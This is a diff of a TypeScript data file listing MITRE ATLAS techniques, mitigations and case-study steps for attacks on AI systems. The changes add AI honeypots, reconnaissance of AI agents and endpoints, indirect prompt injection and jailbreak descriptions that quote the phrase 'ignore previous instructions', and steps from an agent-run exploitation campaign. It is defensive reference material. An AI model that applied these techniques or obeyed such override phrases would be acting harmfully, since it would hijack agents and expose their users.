+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
       }
     ],
     "caseStudies": [
@@ -22233,11 +22907,6 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "id": "AML.CS0023",
         "name": "ShadowRay: Hijacking Exposed Ray Clusters",
         "url": "https://atlas.mitre.org/studies/AML.CS0023"
-      },
-      {
-        "id": "AML.CS0037",
-        "name": "Data Exfiltration via Agent Tools in Copilot Studio",
-        "url": "https://atlas.mitre.org/studies/AML.CS0037"
       },
       {
         "id": "AML.CS0063",
@@ -22270,14 +22939,6 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "tacticId": "AML.TA0002"
       },
       {
-        "caseStudyId": "AML.CS0037",
-        "caseStudyName": "Data Exfiltration via Agent Tools in Copilot Studio",
-        "description": "The researchers look for support email addresses on the target organization's website which may be managed by an AI agent. Then, they probe the system by sending emails and looking for indications of agentic AI in automatic replies.",
-        "url": "https://atlas.mitre.org/studies/AML.CS0037",
-        "stepId": "S00",
-        "tacticId": "AML.TA0002"
-      },
-      {
         "caseStudyId": "AML.CS0063",
         "caseStudyName": "Prompt-Based Attacks Against Gemini via Calendar Invitations",
         "description": "The researchers directly probed Gemini interfaces to understand its agent selection and execution behavior.",
@@ -22298,7 +22959,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek ran the public Langflow scanner and identified a target running Langflow 1.3.4.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S11",
+        "stepId": "S10",
         "tacticId": "AML.TA0002"
       },
       {
@@ -22306,7 +22967,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek sampled approximately 100 Chinese addresses, probed roughly 40 unique systems, identified three running affected versions, inspected form endpoints, and launched parallel scanning against more than 50 remaining targets.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S17",
+        "stepId": "S16",
         "tacticId": "AML.TA0002"
       },
       {
@@ -22315,6 +22976,179 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "The framework probed primary government applications and APIs for exposed interfaces, authentication behavior, misconfigurations, and vulnerabilities. This scanning identified multiple potential paths into the targeted systems.",
         "url": "https://atlas.mitre.org/studies/AML.CS0071",
         "stepId": "S05",
+        "tacticId": "AML.TA0002"
+      }
+    ],
+    "references": []
+  },
+  {
+    "id": "AML.T0006.000",
+    "name": "Enumerate Hosted AI Resources",
+    "description": "Adversaries may directly probe an agentic or SaaS platform to enumerate the resources a specific victim has deployed on it. Platforms frequently host AI agents behind predictable URL structures derived from identifiers such as environment, tenant, resource-group, or agent names, and default out-of-the-box deployment configurations keep these conventions consistent across victims. Adversaries can learn these conventions from public sources such as vendor documentation, code repositories and actual hosted resources, then fuzz or brute-force the derived namespace to discover live AI agents, endpoints, and associated metadata. Discovered resources can be used to identify targets for further access, collection, or attack adaptation.",
+    "tacticId": "AML.TA0002",
+    "tacticName": "Reconnaissance",
+    "tactics": [
+      {
+        "id": "AML.TA0002",
+        "name": "Reconnaissance"
+      }
+    ],
+    "isSubtechnique": true,
+    "parentTechniqueId": "AML.T0006",
+    "parentTechniqueName": "Active Scanning",
+    "url": "https://atlas.mitre.org/techniques/AML.T0006.000",
+    "platforms": [
+      "Predictive AI",
+      "Generative AI",
+      "Agentic AI",
+      "Enterprise"
+    ],
+    "maturity": "Feasible",
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
+    "caseStudies": [],
+    "procedureExamples": [],
+    "references": []
+  },
+  {
+    "id": "AML.T0006.001",
+    "name": "Query Platform Metadata APIs",
+    "description": "Adversaries may query documented or undocumented APIs in agentic SaaS hosting platforms to uncover agentic targets. SaaS and agentic platforms can expose provider control-plane or identity APIs that return tenant, environment, or deployment information IDs, including for resources that are misconfigured or unintentionally accessible by unauthenticated users. \n\nAttackers have been seen abusing this type of functionality to perform information gathering on SaaS platforms, for example via AADInternals' OSINT page,[[aadinternals]] an OSINT online tool showcasing an undocumented API reconnaissance method for Entra ID. This undocumented Power Platform API could be used to uncover environment IDs, which may subsequently be used to scan for public agents. Following the identified abuse, required authentication was added to the tool.",
+    "tacticId": "AML.TA0002",
+    "tacticName": "Reconnaissance",
+    "tactics": [
+      {
+        "id": "AML.TA0002",
+        "name": "Reconnaissance"
+      }
+    ],
+    "isSubtechnique": true,
+    "parentTechniqueId": "AML.T0006",
+    "parentTechniqueName": "Active Scanning",
+    "url": "https://atlas.mitre.org/techniques/AML.T0006.001",
+    "platforms": [
+      "Predictive AI",
+      "Generative AI",
+      "Agentic AI",
+      "Enterprise"
+    ],
+    "maturity": "Feasible",
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
+    "caseStudies": [],
+    "procedureExamples": [],
+    "references": []
+  },
+  {
+    "id": "AML.T0006.002",
+    "name": "Scan for Exposed AI Infrastructure",
+    "description": "Adversaries may scan network ports and services to identify deployed AI backends, model-serving endpoints, and AI agent infrastructure reachable over the internet. Self-hosted AI runtimes typically listen on predictable, well-known ports and expose standard API paths, allowing adversaries to efficiently locate candidate hosts and infer the platform running on them. \n\nAfter identifying candidate hosts, adversaries can interact with them directly to confirm live AI services, fingerprint the software stack, and determine version and configuration details. This information can be used to select exploitable targets and tailor subsequent access attempts.",
+    "tacticId": "AML.TA0002",
+    "tacticName": "Reconnaissance",
+    "tactics": [
+      {
+        "id": "AML.TA0002",
+        "name": "Reconnaissance"
+      }
+    ],
+    "isSubtechnique": true,
+    "parentTechniqueId": "AML.T0006",
+    "parentTechniqueName": "Active Scanning",
+    "url": "https://atlas.mitre.org/techniques/AML.T0006.002",
+    "platforms": [
+      "Predictive AI",
+      "Generative AI",
+      "Agentic AI",
+      "Enterprise"
+    ],
+    "maturity": "Feasible",
+    "attackReference": {
+      "id": "T1595",
+      "url": "https://attack.mitre.org/techniques/T1595/"
+    },
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
+    "caseStudies": [],
+    "procedureExamples": [],
+    "references": []
+  },
+  {
+    "id": "AML.T0006.003",
+    "name": "Probe AI Agent Trigger Channels",
+    "description": "Adversaries may send crafted inputs to potential public triggers, such as email addresses, webhooks, or messaging channels, to elicit a response that indicates an invocation of agentic activity. The nature of the response and its content can often reveal agent-managed accounts and expose the additional agentic attack surface. Identified triggers can be used to directly attack the agent.",
+    "tacticId": "AML.TA0002",
+    "tacticName": "Reconnaissance",
+    "tactics": [
+      {
+        "id": "AML.TA0002",
+        "name": "Reconnaissance"
+      }
+    ],
+    "isSubtechnique": true,
+    "parentTechniqueId": "AML.T0006",
+    "parentTechniqueName": "Active Scanning",
+    "url": "https://atlas.mitre.org/techniques/AML.T0006.003",
+    "platforms": [
+      "Agentic AI",
+      "Enterprise"
+    ],
+    "maturity": "Demonstrated",
+    "attackReference": {
+      "id": "T1595",
+      "url": "https://attack.mitre.org/techniques/T1595/"
+    },
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
+    "caseStudies": [
+      {
+        "id": "AML.CS0037",
+        "name": "Data Exfiltration via Agent Tools in Copilot Studio",
+        "url": "https://atlas.mitre.org/studies/AML.CS0037"
+      }
+    ],
+    "procedureExamples": [
+      {
+        "caseStudyId": "AML.CS0037",
+        "caseStudyName": "Data Exfiltration via Agent Tools in Copilot Studio",
+        "description": "The researchers look for support email addresses on the target organization's website which may be managed by an AI agent. Then, they probe the system by sending emails and looking for indications of agentic AI in automatic replies.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0037",
+        "stepId": "S00",
         "tacticId": "AML.TA0002"
       }
     ],
@@ -24676,6 +25510,11 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "id": "AML.CS0033",
         "name": "Live Deepfake Image Injection to Evade Mobile KYC Verification",
         "url": "https://atlas.mitre.org/studies/AML.CS0033"
+      },
+      {
+        "id": "AML.CS0072",
+        "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072"
       }
     ],
     "procedureExamples": [
@@ -24685,6 +25524,14 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "The researchers obtained [Virtual Camera: Live Assist](https://apkpure.com/virtual-camera-live-assist/virtual.camera.app), an Android app that allows a user to substitute the devices camera  with a video stream. This app works on genuine, non-rooted Android devices.",
         "url": "https://atlas.mitre.org/studies/AML.CS0033",
         "stepId": "S03",
+        "tacticId": "AML.TA0003"
+      },
+      {
+        "caseStudyId": "AML.CS0072",
+        "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "description": "Operators adopted publicly available tooling built to generate AI assistant links carrying embedded memory instructions. The tooling included an npm package, a web-based link generator, and website plugins marketed as a search optimization technique for large language models.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072",
+        "stepId": "S00",
         "tacticId": "AML.TA0003"
       }
     ],
@@ -24860,7 +25707,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "The actor obtained and configured Hermes Agent as the offensive framework, together with scripts and conventional scanning and exploitation utilities. Hermes provided terminal access, Telegram-based operator control, and a skills system.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S02",
+        "stepId": "S01",
         "tacticId": "AML.TA0003"
       }
     ],
@@ -24963,7 +25810,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "The actor obtained access to several generative-AI models and services while evaluating an operational toolset. DeepSeek was selected as the primary reasoning engine for the autonomous attack activity.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S01",
+        "stepId": "S00",
         "tacticId": "AML.TA0003"
       }
     ],
@@ -25046,7 +25893,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek downloaded a public PoC for Langflow CVE-2026-33017. The report does not establish material modification.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S10",
+        "stepId": "S09",
         "tacticId": "AML.TA0003"
       },
       {
@@ -25054,7 +25901,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek downloaded the public n8n PoC chaining CVE-2026-21858 and CVE-2025-68613 and inspected its affected versions and prerequisites.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S15",
+        "stepId": "S14",
         "tacticId": "AML.TA0003"
       }
     ],
@@ -25099,7 +25946,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "The actor obtained agent-specific capabilities, including Hermes's framework-bundled godmode skill and the open-source FofaMap MCP server. The MCP server exposed FOFA asset search, natural-language query translation, and Nuclei scan generation to DeepSeek. Unit 42 does not establish that godmode was invoked during the recovered session.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S03",
+        "stepId": "S02",
         "tacticId": "AML.TA0003"
       }
     ],
@@ -25514,7 +26361,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "The actor created two Hermes skills. web-terminal-exploitation encoded a procedure for unauthenticated WebSocket exploitation, while fofa-cyberspace-search instructed DeepSeek to use the actor's fofoapi.py script for internet asset enumeration. The observed FOFA workflow is consistent with the latter skill; the report does not attribute an action in the recovered session to web-terminal-exploitation.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S04",
+        "stepId": "S03",
         "tacticId": "AML.TA0003"
       }
     ],
@@ -27451,6 +28298,13 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "Implement logging of inputs and outputs of deployed AI models. When deploying AI agents, implement logging of the intermediate steps of agentic actions and decisions, data access and tool use, installation commands, and identity of the agent. Monitoring logs can help to detect security threats and mitigate impacts.\n\nAdditionally, having logging enabled can discourage adversaries who want to remain undetected from utilizing AI resources.",
         "useDescription": "Telemetry logging can help audit API usage of the model.",
         "url": "https://atlas.mitre.org/mitigations/AML.M0024"
+      },
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Honeypots capture which endpoints adversaries are targeting and how they use discovered inference APIs: the models they're interested in, the parameters they use, and the payloads they submit once they reach a live endpoint.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
       }
     ],
     "caseStudies": [
@@ -27583,7 +28437,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "Hermes accessed DeepSeek through its native API and used the model for vulnerability assessment, target selection, command generation, and operational decisions.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S05",
+        "stepId": "S04",
         "tacticId": "AML.TA0000"
       }
     ],
@@ -29612,7 +30466,15 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
     },
     "createdDate": "2023-02-28",
     "modifiedDate": "2026-05-27",
-    "mitigations": [],
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Honeypots can safely absorb real attacks and exploit attempts, turning payloads into mapped defensive signatures for a potential target without risking real assets.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
     "caseStudies": [
       {
         "id": "AML.CS0023",
@@ -29628,11 +30490,6 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "id": "AML.CS0030",
         "name": "LLM Jacking",
         "url": "https://atlas.mitre.org/studies/AML.CS0030"
-      },
-      {
-        "id": "AML.CS0048",
-        "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
-        "url": "https://atlas.mitre.org/studies/AML.CS0048"
       },
       {
         "id": "AML.CS0052",
@@ -29686,14 +30543,6 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "tacticId": "AML.TA0004"
       },
       {
-        "caseStudyId": "AML.CS0048",
-        "caseStudyName": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
-        "description": "The researcher exploited a proxy misconfiguration present in ClawdBot's control server to gain access to control interfaces that had authentication enabled.",
-        "url": "https://atlas.mitre.org/studies/AML.CS0048",
-        "stepId": "S01",
-        "tacticId": "AML.TA0004"
-      },
-      {
         "caseStudyId": "AML.CS0052",
         "caseStudyName": "LLMSmith: RCE Vulnerabilities in LLM-Integrated Applications",
         "description": "The researchers targeted public-facing applications that expose an AI agent to user input as a means to execute their prompts.",
@@ -29722,7 +30571,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek attempted exploitation, but no target exposed either required prerequisite. No access was obtained.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S12",
+        "stepId": "S11",
         "tacticId": "AML.TA0004"
       },
       {
@@ -29730,7 +30579,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek attempted to find and exploit a system meeting the PoC prerequisites. All discovered forms required authentication, and no attempt produced file read, code execution, or initial access.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S18",
+        "stepId": "S17",
         "tacticId": "AML.TA0004"
       },
       {
@@ -29900,7 +30749,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       {
         "id": "AML.T0051.001",
         "name": "Indirect",
-        "description": "An adversary may inject prompts indirectly via a separate data channel ingested by the LLM, such as text or multimedia pulled from databases or websites.\nThese malicious prompts may be hidden or obfuscated from the user. This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.",
+        "description": "An adversary may inject prompts indirectly via a separate data channel that the LLM or AI agent ingests, such as text or multimedia pulled from documents, emails, databases or websites. These instructions originate from adversary-controlled content rather than the legitimate user, and are frequently hidden or obfuscated (See [LLM Prompt Obfuscation](/techniques/AML.T0068)) from the user, for example as invisible text.\n\nAdversaries may use this to hijack an agent or LLM in order to gain a foothold in the target system or to act against an unwitting user of that system, inheriting whatever privileges the AI system holds. Adversaries may also stage the lure that causes the content to be reached (See [AI Agent Clickbait](/techniques/AML.T0100)), or use the resulting foothold to establish persistence (See [AI Agent Context Poisoning](/techniques/AML.T0080)).\n\nIndirect prompt injections have been observed in the wild, with potential impact ranging from harmless pranks, to search engine optimization manipulation, data exfiltration, and destructive actions.[[google-prompt-injections-web]]",
         "url": "https://atlas.mitre.org/techniques/AML.T0051.001"
       },
       {
@@ -30186,7 +31035,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0051.001",
     "name": "Indirect",
-    "description": "An adversary may inject prompts indirectly via a separate data channel ingested by the LLM, such as text or multimedia pulled from databases or websites.\nThese malicious prompts may be hidden or obfuscated from the user. This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.",
+    "description": "An adversary may inject prompts indirectly via a separate data channel that the LLM or AI agent ingests, such as text or multimedia pulled from documents, emails, databases or websites. These instructions originate from adversary-controlled content rather than the legitimate user, and are frequently hidden or obfuscated (See [LLM Prompt Obfuscation](/techniques/AML.T0068)) from the user, for example as invisible text.\n\nAdversaries may use this to hijack an agent or LLM in order to gain a foothold in the target system or to act against an unwitting user of that system, inheriting whatever privileges the AI system holds. Adversaries may also stage the lure that causes the content to be reached (See [AI Agent Clickbait](/techniques/AML.T0100)), or use the resulting foothold to establish persistence (See [AI Agent Context Poisoning](/techniques/AML.T0080)).\n\nIndirect prompt injections have been observed in the wild, with potential impact ranging from harmless pranks, to search engine optimization manipulation, data exfiltration, and destructive actions.[[google-prompt-injections-web]]",
     "tacticId": "AML.TA0005",
     "tacticName": "Execution",
     "tactics": [
@@ -30205,7 +31054,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
     ],
     "maturity": "Demonstrated",
     "createdDate": "2023-10-25",
-    "modifiedDate": "2026-05-27",
+    "modifiedDate": "2026-09-15",
     "mitigations": [
       {
         "id": "AML.M0024",
@@ -30467,7 +31316,14 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "tacticId": "AML.TA0005"
       }
     ],
-    "references": []
+    "references": [
+      {
+        "sourceName": "AI threats in the wild: The current state of prompt injections on the web",
+        "description": "AI threats in the wild: The current state of prompt injections on the web",
+        "url": "https://blog.google/security/prompt-injections-web/",
+        "externalId": "google-prompt-injections-web"
+      }
+    ]
   },
   {
     "id": "AML.T0051.002",
@@ -31275,7 +32131,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0054",
     "name": "LLM Jailbreak",
-    "description": "Adversaries may induce a large language model (LLM) to ignore, circumvent, or override its safety/alignment behaviors and/or guardrails to elicit outputs the model is intended to withhold. Once jailbroken, the LLM may be used in unintended ways by the adversary. Jailbreaks may be achieved via adversarial prompting, or by modifying model weights or safety mechanisms.\n\nAdversaries may attempt a jailbreak for [Defense Evasion](/tactics/AML.TA0007) of the LLM's guidelines and guardrails itself to then reveal information (ex: [LLM Data Leakage](/techniques/AML.T0057), [Discover LLM System Information](/techniques/AML.T0069)) or generate harmful content (ex: [Generate Malicious Commands](/techniques/AML.T0102), [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)). They may also jailbreak a model for [Privilege Escalation](/tactics/AML.TA0012) to invoke tools or perform actions for their own purposes (ex: [AI Agent Tool Invocation](/techniques/AML.T0053)) or abuse the agent for a [Command and Control](/tactics/AML.TA0014) channel (ex: [AI Agent](/techniques/AML.T0108)).\n\nAdversaries use a variety of strategies to craft jailbreak prompts. Prompts may target specific models or model families and are iterated upon until successful. Model providers actively update their model guardrails to make them more resistant to jailbreak prompts as new prompts are developed. Common strategies [[jailbreak-guide]] include but are not limited to:\n\n- Instruction override: Use phrasing that attempts to supersede prior constraints (e.g. \"ignore previous instructions\").\n- Roleplay / persona 